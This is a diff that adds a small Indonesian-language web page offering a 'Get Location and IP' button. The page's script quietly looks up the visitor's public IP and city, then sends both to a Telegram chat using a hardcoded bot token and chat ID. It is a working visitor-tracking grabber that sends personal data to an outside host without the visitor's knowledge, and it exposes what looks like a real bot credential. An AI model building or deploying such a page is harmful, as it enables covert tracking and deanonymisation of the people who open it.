@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pelacakan Lokasi dan IP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f4f4f9;
+        }
+        .content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h2>Selamat Datang</h2>
+        <button class="button" id="getLocation">Dapatkan Lokasi dan IP</button>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $('#getLocation').on('click', function() {
+            $.get('https://api.ipify.org?format=json', function(data) {
+                const ip = data.ip;
+                $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
+                    const location = `${locationData.city}, ${locationData.country_name}`;
+                    sendToTelegram(ip, location);
+                });
+            });
+        });
+
+        function sendToTelegram(ip, location) {
+            const telegramBotToken = '7791375028:AAFdGjApp9d47GOH7v9ASKlswwrUXofA2u8'; // Ganti dengan token bot Telegram Anda
+            const chatId = '5701502998'; // Ganti dengan ID chat Telegram Anda
+            const message = `IP: ${ip}\nLokasi: ${location}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            $.get(url, function(response) {
+                console.log("Data berhasil dikirim ke Telegram");
+            });
+        }
+    </script>
+</body>
+</html>
